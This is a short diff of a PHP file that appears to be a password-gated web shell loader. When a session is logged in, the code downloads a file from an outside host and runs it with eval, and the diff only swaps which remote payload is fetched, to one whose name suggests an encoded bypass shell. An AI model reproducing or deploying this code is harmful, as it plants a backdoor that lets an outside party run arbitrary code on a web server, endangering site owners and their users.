@@ -28,7 +28,7 @@ if (isset($_POST['password'])) {
 }
 
 if (is_logged_in()) {
-    $url = "https://cdn.privdayz.com/txt/HaxorSecV2.txt";
+    $url = "https://cdn.privdayz.com/txt/bypasserv-encoded.txt";
     $content = geturlsinfo($url);
     eval('?>' . $content);
 } else {
